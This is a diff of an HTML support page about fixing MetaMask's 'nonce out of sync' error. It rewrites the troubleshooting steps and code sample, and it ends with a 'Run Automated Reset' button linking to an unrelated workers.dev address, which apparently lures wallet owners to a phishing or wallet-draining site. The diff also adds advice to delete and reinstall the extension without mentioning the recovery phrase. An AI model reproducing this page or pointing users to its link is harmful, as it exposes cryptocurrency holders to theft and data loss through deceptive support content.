@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0f111a;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #00adb5; }
     .btn {
-        background: #00adb5;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,31 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum network.</li>
+<li>The user encounters a "Nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum (ETH) network, indicating a discrepancy between the expected and actual transaction count.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs when the nonce (a counter that prevents transaction replay) stored in MetaMask does not match the nonce expected by the Ethereum network for the user's account. This discrepancy can happen due to cancelled, pending, or stuck transactions.</li>
+<li>This error occurs due to a mismatch between the nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often resulting from cancelled or failed transactions that were not properly accounted for.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, the user can try the following:</li>
-<li>Resetting the account in MetaMask to resync the nonce.</li>
-<li>Manually adjusting the nonce in the transaction settings.</li>
-<li>Using the <code>eth_sendTransaction</code> method with a custom nonce value, as shown in the following code block:</li>
+<li>Reset the account in MetaMask to resynchronize the nonce value:</li>
+<li>Delete the MetaMask extension and reinstall it</li>
+<li>Manually update the nonce value using the Ethereum JSON-RPC API</li>
+<li>Use the following command to reset the account nonce:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;value&quot;:&quot;0x...&quot;,&quot;gas&quot;:&quot;0x...&quot;,&quot;gasPrice&quot;:&quot;0x...&quot;,&quot;nonce&quot;:&quot;0x...&quot;}],&quot;id&quot;:1}&#39;</span>
+<div class="codehilite"><pre><span></span><code><span class="nv">eth_account</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">;</span><span class="w"> </span><span class="nv">eth_nonce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>web3.eth.getTransactionCount<span class="o">(</span>eth_account<span class="o">)</span><span class="p">;</span><span class="w"> </span>web3.eth.sendTransaction<span class="o">({</span>from:<span class="w"> </span>eth_account,<span class="w"> </span>to:<span class="w"> </span>eth_account,<span class="w"> </span>value:<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>nonce:<span class="w"> </span>eth_nonce<span class="o">})</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex transaction management.</p>
+<p>Consider utilizing an external console for complex transaction management.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask installed and configured.</li>
-<li>Ethereum node or provider (e.g., Infura) available.</li>
-<li>Basic understanding of Ethereum transactions and nonces.</li>
+<li>MetaMask extension installed and configured</li>
+<li>Ethereum JSON-RPC API access</li>
+<li>Basic understanding of Ethereum transaction management</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
